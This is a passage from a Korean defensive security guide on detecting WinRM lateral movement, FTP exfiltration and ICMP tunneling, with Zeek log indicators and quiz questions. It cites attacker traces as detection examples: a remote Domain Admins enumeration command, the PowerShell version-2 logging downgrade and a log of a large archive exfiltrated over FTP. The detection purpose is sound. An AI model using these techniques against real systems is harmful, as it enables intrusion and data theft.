- `duration=3550.2`(약 1시간) 동안 `orig_pkts=41870` — 인터넷 호스트 하나에 초당 약 12번씩 한 시간 동안 ping. 정상 ping은 몇 개로 끝납니다.
- `orig_bytes=41450112` — 약 41MB가 **밖으로**, 패킷당 약 990바이트. Windows ping은 데이터 32바이트, Linux는 56바이트입니다.
- `resp_bytes=1339840` — 응답당 약 32바이트. 정상 에코 응답은 요청과 **같은 페이로드**를 돌려줍니다. 응답이 다르다면(여기서는 훨씬 작음) 상대가 정상 ping 응답자가 아니라 터널 서버라는 뜻입니다.

볼 것:

- **양:** 외부 호스트 하나로 가는 많은 ICMP, 또는 오래 이어지는 ICMP 세션.
- **크기:** 평소의 32/56바이트(또는 우리 모니터링 도구의 알려진 크기)가 아닌 에코 페이로드, 특히 큰 것.
- **내용:** OS 무늬가 아닌 페이로드, 높은 엔트로피, 요청과 응답의 페이로드가 다름.
- **누가:** 역할상 필요도 없는데 인터넷으로 ping을 보내는 서버나 PC.
- **정책:** 필요한 ICMP 타입만 허용합니다(내부 모니터링, 그리고 경로 MTU 탐색에 쓰이는 "조각화 필요" 타입 3 코드 4 — 이건 막지 마세요). 필요 없는 호스트에서는 **인터넷으로 나가는 에코를 막습니다.**

아무 데이터나 담을 수 있는 칸이 있는 프로토콜이라면 모두 같은 생각이 적용됩니다. 또 하나의 고전은 DNS입니다([DNS 악용](../dns/dns-abuse.md)).

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    여기 내용은 전부 지금도 맞습니다. PowerShell 원격은 여전히 WinRM 위에서 돌고 5985/5986에서 기다립니다. 여전히 Windows Server는 기본으로 켜져 있고 클라이언트는 꺼져 있으며, 훔친 관리자 자격 증명으로 이를 악용하는 것(MITRE ATT&CK **T1021.006 Windows Remote Management**)은 사람이 직접 조작하는 침입에서 흔한 단계입니다. 도착지 패턴 — 4624 타입 3, WinRM 91, `wsmprovhost.exe`의 자식 프로세스, PowerShell 400 `ServerRemoteHost`와 4104 — 이 여전히 찾는 방법이고, 허용 출발지·목적지 대역을 정하는 것이 여전히 핵심 통제입니다. FTP는 여전히 암호화가 없고 여전히 유출에 등장하며, "안 쓰면 FTP가 보이는 것 자체에 경보"는 여전히 맞는 정책입니다. ICMP에는 여전히 자유로운 페이로드 칸이 있고, ICMP 터널과 ICMP로 깨우는 뒷문은 2025~2026년에도 계속 보고되며, 네트워크 탐지 제품들도 여전히 ICMP 터널 전용 탐지를 넣어 두고 있습니다.

!!! info "[변경됨] 바뀐 점"
    - **Windows PowerShell 2.0이 사라졌습니다.** Microsoft는 Windows 11 24H2(2025년 8월)와 Windows Server 2025(2025년 9월)에서 PowerShell 2.0 엔진을 없앴습니다. 스크립트 블록 로깅도 AMSI도 없는 옛 엔진으로 내려가는 공격 수법 `powershell.exe -version 2`가 이 시스템들에서는 더 이상 통하지 않아서, 4104를 더 믿을 수 있게 됐습니다. 더 오래된 시스템에는 지우지 않았다면 아직 남아 있으니, 거기서는 `-version 2` / `-v 2`를 계속 찾으세요.
    - **SSH 위의 PowerShell 7 원격**이 Windows·Linux가 섞인 환경에서 흔해졌습니다. 그래서 원격이 5985가 아니라 22번 포트에서 보일 수도 있습니다. 둘 다 보세요.
    - **공격 도구가 기성 클라이언트로 옮겨 갔습니다.** Evil-WinRM(Linux에서 실행)과 흔한 공격 프레임워크의 원격 실행 모듈이 WinRM과 직접 대화합니다. HTTP User-Agent와, 출발지가 Windows가 아닌 호스트라는 점이 기본 클라이언트와 다를 수 있습니다.
    - **FTP는 사실상 브라우저에서 빠졌고**(2021년 Chrome·Firefox에서 제거), 요즘 파일 전송 쪽 공격은 단순한 FTP 서버보다 관리형 파일 전송(MFT) *제품*과 그 웹 화면을 노리는 경우가 많습니다. 유출도 점점 HTTPS로 클라우드 저장소에 올리거나 정상 동기화·전송 도구(rclone 등)를 쓰는 쪽으로 가고 있어서, FTP는 이제 여러 유출 경로 중 하나입니다. 그쪽도 함께 보세요.
    - **ICMP 비밀 통로는 이제 대량 유출만큼이나 은밀한 뒷문에** 쓰입니다. 조용히 듣고 있다가 조작된 ICMP/UDP/TCP 패킷 하나에 깨어나는 악성코드로, Linux 서버와 네트워크 장비를 노립니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **네트워크 센서가 5985의 WinRM 명령을 읽을 수 있다고 생각하지 마세요.** Kerberos/NTLM을 쓰면 본문이 암호화됩니다. 명령은 도착지의 **4104 스크립트 블록 로깅**에서, "누가 어디로 접속했나"는 WinRM 6/91과 4624에서 얻습니다.
    - **도구가 안 돈다고 Basic 인증이나 암호화 안 된 트래픽(`AllowUnencrypted=true`)을 허용해서 "고치지" 마세요.** 자격 증명과 명령이 평문으로 나갑니다. HTTPS가 필요하면 제대로 된 인증서로 5986 수신기를 만드세요.
    - 워크그룹 원격을 돌리려고 관리용 PC의 **`TrustedHosts`를 `*`로 두지 마세요.** 서버 신원 확인이 사라집니다.
    - **FTP를 경계에서만 보지 마세요.** 모아 두기와 자격 증명 유출은 내부 FTP에서 일어납니다.
    - **ICMP를 전부 막지는 마세요.** "조각화 필요"를 막으면 경로 MTU 탐색이 깨져서 원인 모를 연결 멈춤이 생깁니다. 필요 없는 곳의 나가는 에코를 막고, 허용하는 것은 들여다보세요.

## 확인 문제 { #quiz }

### 문제 1

서버 `srv-app-0007`에서 다음을 찾았습니다. `10.20.30.41`에서 온 `CORP\svc-deploy`의 4624 로그온 타입 3, WinRM 이벤트 91, 그리고 부모가 `wsmprovhost.exe`인 `cmd.exe /c net group "Domain Admins" /domain`의 Sysmon 1. `10.20.30.41`은 일반 사용자 노트북입니다. 무슨 일이 있었고, (a) 그 밖에 무엇이 실행됐는지, (b) 공격자가 또 어디로 갔는지 찾으려면 어떤 로그를 쓰겠습니까?

??? success "정답과 해설"
    **무슨 일:** 누군가 사용자 노트북 `10.20.30.41`에서 `svc-deploy` 자격 증명으로 서버에 **PowerShell 원격** 접속을 했습니다. 4624 타입 3은 원격이 쓰는 네트워크 로그온이고, WinRM 91은 서버가 원격 셸을 만들었다는 기록이며, `wsmprovhost.exe`는 원격 세션을 돌려 주는 프로세스라서 이것이 띄운 것 — 여기서는 Domain Admins 그룹 조회 — 은 원격에서 실행된 것입니다. 관리용 원격은 사용자 노트북이 아니라 점프 호스트에서 와야 하므로, 노트북은 뚫렸고 `svc-deploy`는 털렸다고 봅니다.

    **(a) 그 밖에 실행된 것:** `srv-app-0007`의 PowerShell **4104**(스크립트 블록 로깅)와 **4103**에서 명령 자체를 봅니다(5985의 네트워크 트래픽은 암호화되어 있었으니까요). 세션 시작 시각은 `HostName=ServerRemoteHost`가 든 PowerShell **400**, 그리고 부모가 `wsmprovhost.exe`인 모든 Sysmon 1 / 4688.

    **(b) 또 어디로:** **노트북**의 WinRM **6** 이벤트 — 연결 문자열마다 목적지가 적혀 있습니다 — 와 5985/5986 포트로 간 Sysmon 3. 네트워크에서는 `10.20.30.41`에서 5985/5986으로 간 모든 `conn.log` 줄. 전체 환경에서는 `10.20.30.41`에서 온 `svc-deploy`의 4624 타입 3.

### 문제 2

Zeek에 `id.orig_h=10.20.0.44 id.resp_h=203.0.113.90 id.resp_p=21 user=drop command=STOR mime_type=application/x-7z-compressed file_size=1610612736`이 찍혔습니다. 우리 조직에는 승인된 FTP가 없습니다. 각 부분을 해석하고 왜 중요한지, 그리고 유출에 쓰이지 않더라도 FTP가 드러내는 위험 두 가지를 말하세요.

??? success "정답과 해설"
    **해석:** 내부 호스트(`10.20.0.44`)가 **인터넷** 호스트(`203.0.113.90`)의 21번 포트로 FTP 제어 연결을 열고, `drop`으로 로그인해서, 약 1.5GB짜리 7-Zip 압축 파일을 `STOR` — **업로드** — 했습니다. 압축 파일 + 큰 크기 + 밖으로 + 우리가 안 쓰는 프로토콜 = 자료를 모아서 **유출**한 것입니다. 승인된 FTP가 없으니 FTP라는 것만으로도 경보여야 하고, 세부 내용이 이걸 거의 확실한 사고로 만듭니다. 다음 단계: `10.20.0.44`에서 무엇이 압축 파일을 만들었는지(프로세스·파일 이벤트), 공격자가 어떻게 거기 들어왔는지 보고, `203.0.113.90`을 차단합니다.

    **다른 위험:** (1) **평문 자격 증명** — `USER`/`PASS`가 암호화 없이 지나가서 엿볼 수 있고(다른 곳에서 재사용될 수도 있음), (2) **바꿔치기** — 전송 중인 파일을 고칠 수 있음, (3) 익스플로잇으로 침투에 쓰일 수 있는 **오래되고 취약한 FTP 서버 프로그램**. 내부 FTP 서버가 자료를 모아 두는 곳이 되는 것도 있습니다.

### 문제 3

동료가 말합니다. "ICMP는 그냥 ping이에요. 안에 데이터가 없으니까 어디로든 나가게 둬도 돼요." 바로잡고, ICMP 터널을 드러내는 `conn.log`나 패킷 캡처의 신호 두 가지를 말하세요.

??? success "정답과 해설"
    **바로잡기:** ICMP 에코 패킷에는 **무엇이든** 담을 수 있는 페이로드 칸이 있고, 패킷 하나에 최대 65,507바이트이며, 받는 쪽은 내용을 확인하지 않습니다. 패킷 제작 도구나 ICMP 터널 프로그램만 있으면 공격자는 에코 요청에 훔친 자료를 실어 내보내고 응답으로 명령을 받을 수 있습니다. 아무 검사 없이 어디로든 허용하면 "그냥 ping"이 비밀 통로가 됩니다.

    **신호:** (1) **양과 시간** — 외부 호스트 하나로 오랫동안 수천 개의 에코 요청(예: 한 시간에 `orig_pkts=41870`). 정상 ping은 몇 개입니다. (2) **크기와 내용** — OS의 정상 32바이트(Windows 알파벳)나 56바이트(Linux 시각 값 + 올라가는 바이트)가 아닌 페이로드, 크거나 엔트로피가 높은 페이로드, 그리고 **요청과 페이로드가 다른 응답** — 진짜 ping 응답자는 절대 그러지 않습니다. 정책: 필요 없는 호스트의 나가는 에코는 막되, "조각화 필요" 같은 꼭 필요한 타입은 남겨 둡니다.

## 관련 레퍼런스 { #related }

- [WMI와 WinRM](../../../adversary/wmi-winrm.md) · [PowerShell 다운로드 크레이들](../../../adversary/powershell-cradles.md) · [PsExec와 SMB 횡적 이동](../../../adversary/psexec-smb.md)
- [LOLBins(있는 걸로 버티기 도구)](../../../adversary/lolbins.md) · [LSASS 덤프](../../../adversary/lsass-dumping.md)
- [DNS 악용](../dns/dns-abuse.md) — 또 하나의 고전적인 비밀 통로
- [Windows 이벤트 ID](../../../basics/windows-event-ids.md) · [잘 알려진 포트](../../../basics/well-known-ports.md)
- [Zeek conn.log](../../../network/zeek/conn-log.md) · [Wireshark와 tshark](../../../network/wireshark-tshark.md)
- [SMB](smb.md) · [SSH, RDP와 VNC](ssh-rdp-vnc.md)
